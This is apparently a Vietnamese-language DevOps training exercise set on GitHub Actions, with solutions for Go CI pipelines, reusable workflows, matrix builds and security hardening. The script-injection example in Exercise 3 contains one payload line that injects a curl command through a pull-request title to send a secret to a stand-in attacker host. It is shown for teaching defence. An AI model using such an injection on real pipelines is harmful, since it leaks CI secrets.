# Day 33: GitHub Actions Deep Dive — Exercises

## Exercise 1: Basic CI Workflow (Easy)

### Context

Bạn vừa tạo một Go microservice và cần setup CI pipeline đầu tiên bằng GitHub Actions. Pipeline cần chạy lint, test, và build Docker image trên mỗi push/PR.

### Yêu cầu

1. Tạo Go project với handler đơn giản và unit tests (dùng code từ lesson).
2. Viết GitHub Actions workflow `.github/workflows/ci.yaml` với 3 jobs: lint, test, build.
3. Validate YAML syntax locally.
4. (Optional) Test locally bằng `act` nếu đã cài.

### Expected Outcome

- Workflow file YAML hợp lệ.
- Lint và test jobs chạy parallel.
- Build job chạy sau lint + test.
- Caching enabled cho Go modules.
- Timeout configured cho mỗi job.

### Hints

- Dùng `actions/setup-go@v5` với `cache: true`.
- Jobs không có `needs` sẽ chạy parallel.
- Validate YAML: `python3 -c "import yaml,sys; yaml.safe_load(open('.github/workflows/ci.yaml'))"`.

### Acceptance Criteria

- [ ] Workflow file tồn tại và YAML valid.
- [ ] 3 jobs defined: lint, test, build.
- [ ] lint + test chạy parallel (không `needs`).
- [ ] build `needs: [lint, test]`.
- [ ] Go cache enabled.
- [ ] `timeout-minutes` set cho mỗi job.
- [ ] `permissions` explicitly defined (least privilege).

### Bonus Challenge

Thêm coverage check: fail nếu < 50%. Upload coverage artifact.

<details>
<summary>Solution</summary>

```bash
# Setup project
mkdir -p ~/gha-ex1 && cd ~/gha-ex1
git init

# Create Go files (copy from lesson)
cat > go.mod << 'EOF'
module github.com/example/myservice
go 1.22
EOF

cat > main.go << 'EOF'
package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
)

func healthHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"status":"healthy"}`)
}

func helloHandler(w http.ResponseWriter, r *http.Request) {
	name := r.URL.Query().Get("name")
	if name == "" {
		name = "World"
	}
	fmt.Fprintf(w, "Hello, %s!", name)
}

func main() {
	http.HandleFunc("/health", healthHandler)
	http.HandleFunc("/hello", helloHandler)
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	log.Fatal(http.ListenAndServe(":"+port, nil))
}
EOF

cat > main_test.go << 'EOF'
package main

import (
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestHealthHandler(t *testing.T) {
	req := httptest.NewRequest("GET", "/health", nil)
	w := httptest.NewRecorder()
	healthHandler(w, req)
	if w.Code != 200 {
		t.Errorf("expected 200, got %d", w.Code)
	}
}

func TestHelloHandler(t *testing.T) {
	tests := []struct{ query, want string }{
		{"", "Hello, World!"},
		{"?name=CI", "Hello, CI!"},
	}
	for _, tt := range tests {
		req := httptest.NewRequest("GET", "/hello"+tt.query, nil)
		w := httptest.NewRecorder()
		helloHandler(w, req)
		if w.Body.String() != tt.want {
			t.Errorf("got %q, want %q", w.Body.String(), tt.want)
		}
	}
}
EOF

cat > Dockerfile << 'EOF'
FROM golang:1.22-alpine AS builder
WORKDIR /app
COPY go.mod ./
COPY . .
RUN CGO_ENABLED=0 go build -ldflags="-s -w" -o myservice .

FROM gcr.io/distroless/static:nonroot
COPY --from=builder /app/myservice /myservice
USER nonroot:nonroot
EXPOSE 8080
ENTRYPOINT ["/myservice"]
EOF

# Create workflow
mkdir -p .github/workflows

cat > .github/workflows/ci.yaml << 'EOF'
name: CI Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

env:
  GO_VERSION: '1.22'

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-go@v5
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true
      - name: Format check
        run: test -z "$(gofmt -l .)"
      - name: Vet
        run: go vet ./...

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-go@v5
        with:
          go-version: ${{ env.GO_VERSION }}
          cache: true
      - name: Run tests
        run: go test -v -race -coverprofile=coverage.out ./...
      - name: Coverage check
        run: |
          COV=$(go tool cover -func=coverage.out | grep total | awk '{print $3}' | tr -d '%')
          echo "Coverage: ${COV}%"
          if (( $(echo "$COV < 50" | bc -l) )); then
            echo "::error::Coverage below 50%"
            exit 1
          fi
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: coverage
          path: coverage.out
          retention-days: 7

  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v6
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v5
        with:
          context: .
          push: false
          tags: myservice:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
EOF

# Validate
python3 -c "import yaml; yaml.safe_load(open('.github/workflows/ci.yaml')); print('YAML valid ✅')"

# Test locally (nếu có Go)
go test -v ./...
gofmt -l .
docker build -t myservice:test .

# Cleanup
cd ~ && rm -rf ~/gha-ex1
```

</details>

---

## Exercise 2: Reusable Workflow & Matrix Build (Medium)

### Context

Team bạn có 4 microservices (Go), mỗi service cần cùng CI pipeline. Thay vì copy-paste workflow, bạn cần tạo reusable workflow và dùng matrix build để test trên nhiều Go versions.

### Yêu cầu

1. Tạo **reusable workflow** `.github/workflows/reusable-go-ci.yaml`:
   - Input: `service_name`, `go_version` (optional, default `1.22`).
   - Jobs: lint, test (with coverage), build Docker image.
2. Tạo **caller workflows** cho 2 services:
   - `payment-service` (Go 1.22)
   - `user-service` (Go 1.21 + 1.22 matrix)
3. Tạo **composite action** `.github/actions/go-setup/action.yaml`:
   - Reusable setup: checkout + setup-go + cache.
4. Viết test matrix cho `user-service`: Go 1.21 + 1.22, ubuntu + macos.

### Expected Outcome

- 1 reusable workflow file.
- 2 caller workflow files.
- 1 composite action.
- Matrix config cho user-service.

### Hints

- Reusable workflow: `on: workflow_call` với `inputs`.
- Caller: `uses: ./.github/workflows/reusable-go-ci.yaml`.
- Composite action: `using: composite` trong action.yaml.
- Matrix: `strategy.matrix` trong job definition.

### Acceptance Criteria

- [ ] Reusable workflow với inputs/outputs defined.
- [ ] 2 caller workflows dùng reusable workflow.
- [ ] Composite action hoạt động (tách setup steps).
- [ ] Matrix build cho user-service (4 combinations).
- [ ] `fail-fast: false` cho matrix.
- [ ] Tất cả YAML files valid.

### Bonus Challenge

Thêm output từ reusable workflow: `image_tag` — để caller workflow có thể dùng cho deploy step.

<details>
<summary>Solution</summary>

```yaml
# .github/actions/go-setup/action.yaml (Composite Action)
name: Go Setup
description: Setup Go with caching
inputs:
  go-version:
    description: Go version
    required: false
    default: '1.22'
runs:
  using: composite
  steps:
    - uses: actions/checkout@v6
    - uses: actions/setup-go@v5
      with:
        go-version: ${{ inputs.go-version }}
        cache: true

---
# .github/workflows/reusable-go-ci.yaml (Reusable Workflow)
name: Reusable Go CI

on:
  workflow_call:
    inputs:
      service_name:
        required: true
        type: string
      go_version:
        required: false
        type: string
        default: '1.22'
      service_path:
        required: false
        type: string
        default: '.'
    outputs:
      image_tag:
        description: Built image tag
        value: ${{ jobs.build.outputs.tag }}

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: ./.github/actions/go-setup
        with:
          go-version: ${{ inputs.go_version }}
      - run: |
          cd ${{ inputs.service_path }}
          test -z "$(gofmt -l .)"
          go vet ./...

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: ./.github/actions/go-setup
        with:
          go-version: ${{ inputs.go_version }}
      - run: |
          cd ${{ inputs.service_path }}
          go test -v -race -coverprofile=coverage.out ./...
      - uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ inputs.service_name }}
          path: ${{ inputs.service_path }}/coverage.out

  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    outputs:
      tag: ${{ steps.tag.outputs.value }}
    steps:
      - uses: actions/checkout@v6
      - id: tag
        run: echo "value=${{ inputs.service_name }}:${{ github.sha }}" >> $GITHUB_OUTPUT
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v5
        with:
          context: ${{ inputs.service_path }}
          push: false
          tags: ${{ steps.tag.outputs.value }}
          cache-from: type=gha,scope=${{ inputs.service_name }}
          cache-to: type=gha,scope=${{ inputs.service_name }},mode=max

---
# .github/workflows/ci-payment.yaml (Caller 1)
name: Payment Service CI
on:
  push:
    paths: ['services/payment/**']
  pull_request:
    paths: ['services/payment/**']

jobs:
  ci:
    uses: ./.github/workflows/reusable-go-ci.yaml
    with:
      service_name: payment
      service_path: services/payment

  deploy:
    needs: ci
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploy ${{ needs.ci.outputs.image_tag }}"

---
# .github/workflows/ci-user.yaml (Caller 2 - with matrix)
name: User Service CI
on:
  push:
    paths: ['services/user/**']
  pull_request:
    paths: ['services/user/**']

jobs:
  test-matrix:
    runs-on: ${{ matrix.os }}
    timeout-minutes: 10
    strategy:
      fail-fast: false
      matrix:
        go-version: ['1.21', '1.22']
        os: [ubuntu-latest, macos-latest]
        exclude:
          - go-version: '1.21'
            os: macos-latest
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-go@v5
        with:
          go-version: ${{ matrix.go-version }}
          cache: true
      - run: |
          cd services/user
          go test -v -race ./...

  ci:
    needs: test-matrix
    uses: ./.github/workflows/reusable-go-ci.yaml
    with:
      service_name: user
      go_version: '1.22'
      service_path: services/user
```

</details>

---

## Exercise 3: Security Hardening & Environment Protection (Hard)

### Context

Bạn là DevOps lead, cần security-harden CI/CD pipeline cho một fintech startup. Pipeline cần: OIDC auth (không long-lived secrets), environment protection (staging auto, prod manual approval), secret scanning, và supply chain protection.

### Yêu cầu

1. **Viết security-hardened workflow** với:
   - Pinned action versions (SHA).
   - Explicit `permissions` (least privilege).
   - OIDC authentication cho AWS.
   - `concurrency` control.
2. **Thiết kế environment protection**:
   - `staging`: auto-deploy, no protection.
   - `production`: 2 required reviewers, 5-min wait, main branch only.
3. **Thêm security scanning steps**:
   - Secret scanning (gitleaks).
   - Dependency scan (trivy fs).
   - Container scan (trivy image).
4. **Viết script injection prevention** examples.
5. **Thiết kế supply chain protection strategy**:
   - Pinned versions.
   - SBOM generation.
   - Image signing concept.

### Expected Outcome

- Hardened workflow YAML file.
- Environment protection configuration document.
- Security checklist cho CI/CD.
- Script injection examples (vulnerable vs safe).

### Hints

- Pin SHA: `actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11`.
- OIDC: `permissions: id-token: write` + `aws-actions/configure-aws-credentials`.
- gitleaks: `gitleaks/gitleaks-action@v2`.
- Script injection: dùng `env:` thay vì inline `$&#123;&#123; &#125;&#125;` trong `run:`.

### Acceptance Criteria

- [ ] Tất cả actions pinned bằng SHA (không tag).
- [ ] permissions block explicit, least privilege.
- [ ] OIDC auth configured (no static AWS keys).
- [ ] Concurrency control prevents parallel deploys.
- [ ] Secret scanning job.
- [ ] Container scanning job.
- [ ] Environment protection documented.
- [ ] 2 script injection examples (vulnerable + fixed).
- [ ] Supply chain strategy documented.

### Bonus Challenge

Tạo Dependabot config để tự động update GitHub Actions versions (pinned SHAs).

<details>
<summary>Solution</summary>

```yaml
# .github/workflows/secure-ci.yaml
name: Secure CI Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# Explicit least-privilege permissions
permissions:
  contents: read
  packages: write
  id-token: write    # For OIDC
  security-events: write  # For CodeQL/scanning

concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: false  # Don't cancel in-progress deploys

env:
  IMAGE_NAME: payment-service

jobs:
  # Security scanning (parallel)
  secret-scan:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # example full SHA; verify current release before use
        with:
          fetch-depth: 0  # Full history for secret scanning
      - uses: gitleaks/gitleaks-action@cb7149a9b57195b609c63e8518d2c6056677d2d0  # v2.3.3
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  dependency-scan:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Trivy filesystem scan
        uses: aquasecurity/trivy-action@d9cd5b1c23aaf8cb31bb09141028c8bd06b2f623  # v0.16.0
        with:
          scan-type: fs
          exit-code: 1
          severity: CRITICAL,HIGH

  lint-and-test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: actions/setup-go@0c52d547c9bc32b1aa3301fd7a9cb496313a4491  # v5.0.0
        with:
          go-version: '1.22'
          cache: true
      - run: |
          test -z "$(gofmt -l .)"
          go vet ./...
          go test -v -race -coverprofile=coverage.out ./...

  build-and-scan:
    needs: [secret-scan, dependency-scan, lint-and-test]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    outputs:
      image_digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - uses: docker/setup-buildx-action@f95db51fddba0c2d1ec667646a06c2ce06100226  # v3.0.0

      - id: build
        uses: docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56  # v5.1.0
        with:
          context: .
          push: false
          load: true
          tags: ${{ env.IMAGE_NAME }}:${{ github.sha }}

      - name: Container scan
        uses: aquasecurity/trivy-action@d9cd5b1c23aaf8cb31bb09141028c8bd06b2f623
        with:
          image-ref: ${{ env.IMAGE_NAME }}:${{ github.sha }}
          exit-code: 1
          severity: CRITICAL,HIGH

      - name: Generate SBOM
        uses: aquasecurity/trivy-action@d9cd5b1c23aaf8cb31bb09141028c8bd06b2f623
        with:
          image-ref: ${{ env.IMAGE_NAME }}:${{ github.sha }}
          format: spdx-json
          output: sbom.spdx.json

      - uses: actions/upload-artifact@c7d193f32edcb7bfad88892161225aeda64e9392  # v4.0.0
        with:
          name: sbom
          path: sbom.spdx.json

  deploy-staging:
    needs: build-and-scan
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: staging
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-staging
          aws-region: ap-southeast-1
      - name: Deploy
        run: echo "Deploy to staging via GitOps config update"

  deploy-prod:
    needs: deploy-staging
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: production  # Requires 2 approvers + 5min wait
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-prod
          aws-region: ap-southeast-1
      - name: Deploy
        run: echo "Deploy to production via GitOps config update"
```

### Script Injection Examples

```yaml
# ❌ VULNERABLE - attacker can inject commands via PR title
- name: Greet PR author
  run: |
    echo "Processing PR: ${{ github.event.pull_request.title }}"
    # If PR title is: "; curl attacker.com/exfil?secret=$SECRET"
    # → commands get executed!

# ✅ SAFE - use env variable
- name: Greet PR author
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Processing PR: $PR_TITLE"
    # PR_TITLE is treated as a string, not shell code
```

### Dependabot Config

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    commit-message:
      prefix: "ci"
    labels:
      - "dependencies"
      - "ci"
```

### Environment Protection Documentation

```markdown
## Environment Protection Rules

### staging
- Protection: None
- Deploy: Automatic on main branch push
- Rollback: Automatic via GitOps

### production  
- Required reviewers: 2 (from @platform-team)
- Wait timer: 5 minutes
- Branch policy: main only
- Deployment branch: main
- Rollback: Manual git revert → auto-sync
```

</details>

---

## Tổng kết thời lượng

| Exercise | Thời gian | Skill level |
|----------|-----------|-------------|
| Exercise 1: Basic CI Workflow | ~25 phút | Easy |
| Exercise 2: Reusable Workflow & Matrix | ~40 phút | Medium |
| Exercise 3: Security Hardening | ~55 phút | Hard |
| **Tổng** | **~2 giờ** | |

